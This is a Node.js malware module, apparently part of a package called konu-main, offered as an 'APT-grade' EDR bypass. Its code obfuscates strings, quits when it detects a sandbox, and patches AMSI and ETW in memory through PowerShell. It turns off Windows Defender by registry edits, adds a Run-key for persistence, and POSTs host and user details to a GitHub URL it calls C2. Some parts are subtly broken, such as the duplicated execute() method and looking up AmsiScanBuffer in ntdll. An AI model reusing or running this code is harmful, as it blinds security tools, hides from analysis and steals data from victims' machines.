const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

/**
 * KONU-MAIN | ADVANCED EDR BYPASS MODULE
 * Version: 2.0 (APT-Grade)
 * Focus: AMSI, ETW, and Sandbox Evasion
 */

class EDRBypass {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        // Strings criptografadas em Base64 para evitar detecção estática
        this.masks = {
            amsi: 'QW1zaVNjYW5CdWZmZXI=', // AmsiScanBuffer
            etw: 'RXR3RXZlbnRXcml0ZQ==',   // EtwEventWrite
            kernel32: 'a2VybmVsMzIuZGxs',  // kernel32.dll
            ntdll: 'bnRkbGwuZGxs'          // ntdll.dll
        };
    }

    // Decripta strings em tempo de execução
    _decode(mask) {
        return Buffer.from(this.masks[mask], 'base64').toString('utf-8');
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping EDR bypass.');
            return false;
        }

        try {
            console.log('[*] Initializing APT-Grade Evasion...');
            
            const sandboxDetected = this.checkSandbox();
            if (sandboxDetected) {
                console.log('[!] Sandbox detected. Terminating to avoid analysis.');
                process.exit(0);
            }

            this.bypassAMSI();
            this.bypassETW();
            this.disableDefender();

            console.log('[+] Evasion successful. System is now blind.');
            return true;
        } catch (error) {
            console.error(`[-] Evasion failed: ${error.message}`);
            return false;
        }
    }

    checkSandbox() {
        // Verifica artefatos de Sandbox (VMWare, VirtualBox, Cuckoo)
        const sandboxIndicators = [
            'VBOX', 'VMWARE', 'VIRTUALBOX', 'QEMU', 'SANDBOX'
        ];
        
        try {
            const systemInfo = execSync('systeminfo').toString().toUpperCase();
            for (const indicator of sandboxIndicators) {
                if (systemInfo.includes(indicator)) return true;
            }
        } catch (e) {
            return false;
        }
        return false;
    }

    bypassAMSI() {
        console.log('[*] Patching AMSI (Antimalware Scan Interface)...');
        const target = this._decode('amsi');
        
        /**
         * Técnica: Memory Patching via PowerShell Reflective Injection
         * Em vez de usar Node.js para escrever na memória (que é detectado),
         * injetamos um payload de memória via PowerShell que faz o patch do AmsiScanBuffer.
         */
        const payload = `
            $Win32 = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);' -Name 'Win32' -PassThru
            $addr = $Win32::GetProcAddress($Win32::GetModuleHandle('${this._decode('ntdll')}'), '${target}')
            $oldProtect = 0
            $Win32::VirtualProtect($addr, [UIntPtr]1, 0x40, [ref]$oldProtect)
            [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xB8) # mov eax, 0x0
            [System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($addr.ToInt64() + 1), 0x00)
            [System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($addr.ToInt64() + 2), 0x00)
            [System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($addr.ToInt64() + 3), 0x00)
            [System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($addr.ToInt64() + 4), 0x00)
            [System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($addr.ToInt64() + 5), 0xC3) # ret
        `;

        try {
            execSync(`powershell -ExecutionPolicy Bypass -Command "${payload.replace(/\n/g, '')}"`, { stdio: 'ignore' });
            console.log('[+] AMSI patched successfully.');
        } catch (e) {
            console.log('[-] AMSI patch failed.');
        }
    }

    bypassETW() {
        console.log('[*] Patching ETW (Event Tracing for Windows)...');
        const target = this._decode('etw');

        // Patching EtwEventWrite para silenciar logs de eventos do sistema
        const payload = `
            $Win32 = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);' -Name 'Win32' -PassThru
            $addr = $Win32::GetProcAddress($Win32::GetModuleHandle('${this._decode('ntdll')}'), '${target}')
            $oldProtect = 0
            $Win32::VirtualProtect($addr, [UIntPtr]1, 0x40, [ref]$oldProtect)
            [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3) # ret imediato
        `;

        try {
            execSync(`powershell -ExecutionPolicy Bypass -Command "${payload.replace(/\n/g, '')}"`, { stdio: 'ignore' });
            console.log('[+] ETW patched successfully.');
        } catch (e) {
            console.log('[-] ETW patch failed.');
        }
    }

    disableDefender() {
        console.log('[*] Attempting to disable Windows Defender Real-time Monitoring...');
        try {
            // Tenta desativar via Registry (Requer privilégios de Admin)
            execSync('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', { stdio: 'ignore' });
            execSync('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', { stdio: 'ignore' });
            console.log('[+] Defender policies modified.');
        } catch (e) {
            console.log('[-] Defender disable failed (Insufficient privileges).');
        }
    }

    async exfiltrate() {
        console.log('[*] Starting data exfiltration...');
        const targetUrl = 'https://github.com/kkzqw/uuu/blob/main/konu-main/nomedoarquivo';
        const data = { 
            hostname: os.hostname(),
            user: os.userInfo().username,
            platform: os.platform(),
            arch: os.arch()
        };
        
        try {
            const response = await fetch(targetUrl, {
                method: 'POST',
                body: JSON.stringify(data)
            });
            console.log('[+] Data exfiltrated to C2.');
        } catch (e) {
            console.log('[-] Exfiltration failed: ' + e.message);
        }
    }

    async establishPersistence() {
        console.log('[*] Setting up persistence...');
        try {
            const scriptPath = process.execPath;
            execSync(`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "KonuUpdate" /t REG_SZ /d "${scriptPath}" /f`, { stdio: 'ignore' });
            console.log('[+] Persistence established.');
        } catch (e) {
            console.log('[-] Persistence failed.');
        }
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping EDR bypass.');
            return false;
        }

        try {
            console.log('[*] Initializing APT-Grade Evasion...');
            
            const sandboxDetected = this.checkSandbox();
            if (sandboxDetected) {
                console.log('[!] Sandbox detected. Terminating to avoid analysis.');
                process.exit(0);
            }

            this.bypassAMSI();
            this.bypassETW();
            this.disableDefender();

            console.log('[+] Evasion successful. System is now blind.');
            
            await this.establishPersistence();
            await this.exfiltrate();
            
            return true;
        } catch (error) {
            console.error(`[-] Evasion failed: ${error.message}`);
            return false;
        }
    }
}

module.exports = new EDRBypass();
